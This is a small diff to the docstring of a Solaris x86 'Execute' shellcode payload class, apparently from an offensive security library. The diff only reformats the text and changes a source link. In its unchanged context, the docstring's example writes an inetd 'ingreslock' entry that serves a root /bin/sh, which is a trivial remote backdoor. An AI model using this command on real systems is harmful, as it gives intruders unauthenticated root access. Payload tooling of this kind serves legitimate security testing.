@@ -36,6 +36,7 @@ class Execute (Dynamic):
     Execute any command in Solaris/x86.
 
     For example this command sets up a trivial remote backdoor::
+
         from shellgen.x86.solaris.execute import Execute
         payload = Execute(
           "echo \"ingreslock stream tcp nowait root /bin/sh sh -i\">/tmp/x;"
@@ -43,7 +44,7 @@ class Execute (Dynamic):
         )
 
     Based on anonymous code found on the Internet:
-    U{http://www.exploit-db.com/exploits/13502/}
+    `<http://radare.org/y/>`_
     """
 
     qualities = "payload"
